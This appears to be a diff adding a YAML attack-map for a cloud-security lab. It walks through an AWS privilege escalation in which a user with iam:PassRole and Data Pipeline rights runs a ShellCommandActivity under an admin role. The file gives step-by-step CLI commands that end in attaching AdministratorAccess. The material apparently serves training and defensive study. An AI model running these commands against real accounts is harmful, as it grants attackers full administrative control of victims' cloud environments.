@@ -1,0 +1,53 @@
+attackMap:
+  nodes:
+    - id: starting-user
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-datapipeline-001-to-admin-starting-user"
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could have been
+        obtained through many real-world vectors: phishing a developer and gaining access to
+        their workstation, compromising a browser session, exploiting a vulnerable workload
+        running in this AWS account, discovering credentials in a public S3 bucket, or finding
+        them hardcoded in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user has iam:PassRole on an administrative role plus datapipeline:CreatePipeline,
+        datapipeline:PutPipelineDefinition, and datapipeline:ActivatePipeline permissions.
+
+    - id: pipeline-role
+      label: "Admin Pipeline Role"
+      type: principal
+      subType: iam-role
+      isTarget: true
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-datapipeline-001-to-admin-pipeline-role"
+      description: >
+        This IAM role has administrative permissions and can be passed to AWS Data Pipeline
+        EC2 resources via iam:PassRole. When an EC2 instance is launched by the pipeline
+        with this role attached, commands executed on that instance run with the role's
+        elevated permissions, completing the privilege escalation.
+
+  edges:
+    - from: starting-user
+      to: pipeline-role
+      label: "datapipeline:CreatePipeline + PutPipelineDefinition + iam:PassRole"
+      description: >
+        Create a Data Pipeline and define it with a ShellCommandActivity, passing the admin
+        role to the pipeline's EC2 resource via iam:PassRole.
+      hints:
+        - "You can pass IAM roles to AWS services. Which services accept roles?"
+        - "AWS Data Pipeline can launch EC2 instances with a specified IAM role attached."
+        - "Create a pipeline with a ShellCommandActivity that runs IAM commands using the admin role's permissions."
+        - "Browse to https://pathfinding.cloud/paths/datapipeline-001 for technique details."
+      commands:
+        - description: "Create a new Data Pipeline"
+          command: "aws datapipeline create-pipeline --name pl-privesc-pipeline --unique-id pl-privesc-$(date +%s)"
+        - description: "Define the pipeline with a malicious ShellCommandActivity"
+          command: "aws datapipeline put-pipeline-definition --pipeline-id <pipeline-id> --pipeline-objects file://pipeline-definition.json"
+        - description: "Activate the pipeline to trigger execution"
+          command: "aws datapipeline activate-pipeline --pipeline-id <pipeline-id>"
+        - description: "Command run by the EC2 instance via ShellCommandActivity"
+          command: "aws iam attach-user-policy --user-name pl-prod-datapipeline-001-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
+        - description: "Verify administrator access after pipeline completes"
+          command: "aws iam list-attached-user-policies --user-name pl-prod-datapipeline-001-to-admin-starting-user"
